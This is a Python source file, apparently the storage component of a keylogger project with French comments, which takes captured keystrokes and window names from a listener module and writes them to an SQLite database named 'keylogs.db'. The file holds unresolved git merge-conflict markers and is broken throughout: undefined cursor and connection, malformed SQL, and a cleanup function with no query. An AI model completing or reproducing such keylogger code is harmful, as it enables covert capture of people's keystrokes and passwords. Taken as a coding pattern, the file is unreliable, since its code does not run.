import sqlite3
<<<<<<< HEAD
import uuid
from datetime import datetime
import listener
=======
from listener import flush_buffer, last_timestamp
>>>>>>> 977c092 (minor change on storage)
#test  
con = ("keylogs.db")

#_____variables globales pour le buffer et le timestamp____________________________________________
key_data = listener.flush_buffer() #récupère les données du buffer
ts = listener.last_timestamp
window = "Window1" #temporaire a remplacer pars variable
<<<<<<< HEAD
buffer_empty = getattr(listener, "buffer_empty", False)
SESSION_ID = str(uuid.uuid4())[:8]
=======
>>>>>>> 977c092 (minor change on storage)
#___________________________________________________________creation de la table_____________________________________________
def create_table():
    cur.execute(""" CREATE TABLE IF NOT EXISTS keylogs(
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    timestamp TEXT,
    key TEXT,
    window TEXT,
    session_id DEFAULT TEXT'user_session'          #regarder si code correct pour session_id
                ')
    """)
    con.commit()

#___________________________________________________________ insertion de données____________________________________________

def insert_data(timestamp, key, window, session_id):
    if buffer_empty:
        cur.execute("INSERT INTO keylogs(timestamp, key, window, session_id) VALUES (?, ?, ?, ?)", (timestamp, key, window, session_id))
        con.commit()
        buffer_empty = False #réinitialise le buffer_empty aprés insertion
    else:
        print("Buffer en cours d'execution, données non insérées dans la base de données.")

#____________________________________________________________execution du code____________________________________________
create_table()

<<<<<<< HEAD

=======
>>>>>>> 977c092 (minor change on storage)
# netoyage

def clear_old(days=7):
    with sqlite3.connect(con) as conn:
        conn.execute(
            (f"-{days} days",)
        )
        conn.commit()